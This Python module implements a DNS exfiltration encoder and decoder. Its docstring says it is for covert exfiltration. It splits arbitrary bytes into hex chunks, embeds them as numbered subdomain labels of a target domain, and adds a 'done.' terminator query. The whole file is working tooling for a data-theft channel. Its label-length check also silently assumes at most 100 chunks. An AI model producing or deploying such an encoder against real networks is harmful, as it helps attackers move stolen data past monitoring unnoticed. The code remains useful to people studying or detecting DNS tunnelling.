# DNS exfiltration encoder.
# Converts arbitrary bytes into a sequence of DNS subdomain queries.
#
# Encoding pipeline:
#   input bytes -> hex string -> chunked labels -> FQDNs
#
# Each FQDN follows the pattern: {seq:02d}_{chunk}.{target_domain}
# A termination FQDN signals end of stream: done.{target_domain}

from __future__ import annotations

import logging
from dataclasses import dataclass

logger = logging.getLogger(__name__)

# DNS label max length per RFC 1035.
_DNS_LABEL_MAX = 63

# Sequence prefix format: "00_", "01_", ... "99_" — 3 chars overhead.
_SEQ_PREFIX_LEN = 3

# Hard cap on chunk_size to ensure sequence prefix + chunk <= 63.
_MAX_CHUNK_SIZE = _DNS_LABEL_MAX - _SEQ_PREFIX_LEN  # 60


@dataclass
class EncodeResult:
    fqdns: list[str]
    chunk_count: int
    encoded_bytes: int


class DNSExfilEncoder:
    """Encodes bytes into DNS query FQDNs for covert exfiltration.

    Args:
        target_domain: The domain suffix appended to every query label.
        chunk_size: Number of hex characters per subdomain label. Must be <= 60.

    Raises:
        ValueError: If chunk_size exceeds the maximum safe value.
    """

    def __init__(self, target_domain: str, chunk_size: int = 30) -> None:
        if chunk_size > _MAX_CHUNK_SIZE:
            raise ValueError(
                f"chunk_size {chunk_size} exceeds maximum {_MAX_CHUNK_SIZE}. "
                f"DNS labels are capped at {_DNS_LABEL_MAX} chars; "
                f"sequence prefix consumes {_SEQ_PREFIX_LEN}."
            )
        if chunk_size < 1:
            raise ValueError("chunk_size must be at least 1.")
        self.target_domain = target_domain.strip(".")
        self.chunk_size = chunk_size

    def encode(self, data: bytes) -> EncodeResult:
        """Encode bytes into a list of FQDNs to query, in transmission order.

        Args:
            data: Raw bytes to exfiltrate.

        Returns:
            EncodeResult with the FQDN list, chunk count, and original byte count.
        """
        if not data:
            logger.debug("encode called with empty data — returning empty result")
            return EncodeResult(fqdns=[], chunk_count=0, encoded_bytes=0)

        hex_str = data.hex()
        chunks = [
            hex_str[i : i + self.chunk_size]
            for i in range(0, len(hex_str), self.chunk_size)
        ]

        fqdns = [
            f"{seq:02d}_{chunk}.{self.target_domain}"
            for seq, chunk in enumerate(chunks)
        ]
        fqdns.append(f"done.{self.target_domain}")

        logger.debug(
            "encoded %d bytes into %d chunks (%d FQDNs incl. terminator)",
            len(data),
            len(chunks),
            len(fqdns),
        )
        return EncodeResult(fqdns=fqdns, chunk_count=len(chunks), encoded_bytes=len(data))

    def decode(self, fqdns: list[str]) -> bytes:
        """Reconstruct original bytes from an ordered list of FQDNs.

        Strips the termination FQDN and sequence prefixes, then hex-decodes.

        Args:
            fqdns: List of FQDNs as produced by encode(), in order.

        Returns:
            The original bytes.

        Raises:
            ValueError: If a label has an unexpected format.
        """
        if not fqdns:
            return b""

        # Strip termination query.
        data_fqdns = [
            f for f in fqdns if not f.startswith(f"done.{self.target_domain}")
        ]

        hex_parts: list[str] = []
        for fqdn in data_fqdns:
            # Extract label: everything before the first "."
            label = fqdn.split(".")[0]
            # Strip sequence prefix: "00_abc" -> "abc"
            if "_" not in label:
                raise ValueError(
                    f"FQDN label '{label}' missing expected sequence prefix (e.g. '00_')."
                )
            hex_chunk = label.split("_", 1)[1]
            hex_parts.append(hex_chunk)

        full_hex = "".join(hex_parts)
        return bytes.fromhex(full_hex)
